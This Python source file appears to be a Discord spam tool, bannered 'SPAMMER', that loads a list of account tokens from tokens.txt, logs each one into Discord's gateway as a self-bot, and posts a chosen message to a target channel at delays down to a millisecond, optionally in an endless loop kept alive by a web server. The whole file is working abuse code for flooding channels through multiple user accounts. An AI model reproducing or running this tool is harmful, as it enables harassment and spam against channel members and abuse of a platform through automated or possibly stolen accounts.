import json
import time
import websocket
import requests
import os
import platform
from keep_alive import keep_alive

class color:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if (platform.system() == 'Windows'):
  clr = 'cls'
else:
  clr = 'clear'

os.system(clr)
print(color.HEADER +
  "░██████╗██████╗░░█████╗░███╗░░░███╗███╗░░░███╗███████╗██████╗░\n██╔════╝██╔══██╗██╔══██╗████╗░████║████╗░████║██╔════╝██╔══██╗\n╚█████╗░██████╔╝███████║██╔████╔██║██╔████╔██║█████╗░░██████╔╝\n░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝░░██╔══██╗\n██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║██║░╚═╝░██║███████╗██║░░██║\n╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝"
+ color.ENDC)
print("                                          "+ color.UNDERLINE + "Made by Britto" + color.ENDC)

channel = input(color.GREEN + 'Id of channel: ' + color.ENDC) 
mess = input(color.GREEN + "Message: " + color.ENDC) 
delay = input(color.GREEN + 'Delay: ' + color.ENDC)
loop = input(color.GREEN + 'Loop (0=no 1=yes): ' + color.ENDC)
tokens = open("tokens.txt", "r").read().splitlines()
status = "online"

if loop == "":
  loop = 0
elif loop == "1":
  loop = 1
else:
  loop = 0
if channel == "":
  channel = "1035411686460506132"
if mess == "":  
  mess = "owo"
if delay == "":
  delay = 0.001
delay = float(delay)

def spam(token, channel, mess):
  url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
  data = {"content": mess}
  header = {"authorization": token}
  time.sleep(float(delay))
  r = requests.post(url, data=data, headers=header)
  print(color.WARNING + str(r.status_code) + color.ENDC)

def onliner(token, status):
  ws = websocket.WebSocket()
  ws.connect('wss://gateway.discord.gg/?v=9&encoding=json')
  auth = {
    "op": 2,
    "d": {
      "token": token,
      "properties": {
        "$os": "linux",
        "$browser": "disco",
        "$device": "disco"
      },
      "presence": {
        "activities": [{
          "name": "",
          "type": 0
        }],
        "status": status,
        "afk": False
      }
    },
    "s": None,
    "t": None
  }
  ws.send(json.dumps(auth))
  online = {"op": 1, "d": "None"}
  time.sleep(0.01)
  ws.send(json.dumps(online))

def thread():
  channel_id = channel
  text = mess
  while True:
    os.system(clr)
    for token in tokens:
      def run_onliner():
        onliner(token, status)
        headers = {"Authorization": token, "Content-Type": "application/json"}
        userinfo = requests.get('https://discordapp.com/api/v9/users/@me', headers=headers).json()
        username = userinfo["username"]
        discriminator = userinfo["discriminator"]
        userid = userinfo["id"]
        print(f"{color.GREEN}Logged in as {username}#{discriminator} {color.CYAN}({userid}){color.ENDC}")
      run_onliner()
      spam(token, channel_id, text)
    if loop==0:
      break
start = input('Press any key to start...')
keep_alive()
start = thread()
